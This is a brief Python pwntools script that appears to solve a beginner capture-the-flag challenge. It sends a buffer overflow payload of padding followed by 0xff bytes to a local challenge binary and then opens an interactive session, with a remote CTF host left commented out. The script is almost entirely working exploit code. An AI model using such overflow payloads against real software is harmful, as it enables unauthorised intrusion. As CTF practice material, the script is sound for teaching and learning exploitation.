from pwn import *

io = process("./beginner-generic-pwn-number-0")
#io = remote('mc.ax', 31077)

payload = b""
payload += b"A"*32 + b"B"*8
payload += b"\xff"*8

io.sendlineafter(":(", payload)
io.interactive()
